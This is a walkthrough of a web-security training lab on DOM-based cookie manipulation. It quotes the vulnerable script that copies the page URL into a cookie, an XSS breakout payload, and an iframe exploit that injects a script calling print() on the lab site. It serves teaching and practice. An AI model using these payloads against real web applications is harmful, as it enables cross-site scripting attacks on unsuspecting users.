Title: DOM-based cookie manipulation
Level: PRACTITIONER
Desc: This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages. 
Theory: The document.cookie sink can lead to DOM-based cookie-manipulation vulnerabilities. 

# Walkthrough: 
On the page `https://0ac8006104847ea580d4b20d003f0063.web-security-academy.net/product?productId=1` I can see code: 

```
 <script>
 document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
 </script>
```
This code gives possibility to add to cookie values from url. We control value of cookie.
<img width="1132" height="574" alt="image" src="https://github.com/user-attachments/assets/6158e2be-d2e9-4aff-b36d-c8c624ed07bc" />




I found out, that we can manually add below payload to the cookie and when we click button: "Last viewed product" we can see our XSS executed.
`'><script>alert(1)</script><a href='`

Now we need to send iframe to the victim, whichc has XSS payload as a part of the url, then after loading this value goes to the source code of "Last viewed product" and we have XSS:

`<iframe src="https://0ac8006104847ea580d4b20d003f0063.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0ac8006104847ea580d4b20d003f0063.web-security-academy.net';window.x=1;">`

section `onload="if(!window.x)this.src='https://0ac8006104847ea580d4b20d003f0063.web-security-academy.net';window.x=1;` is to make a reload of page.

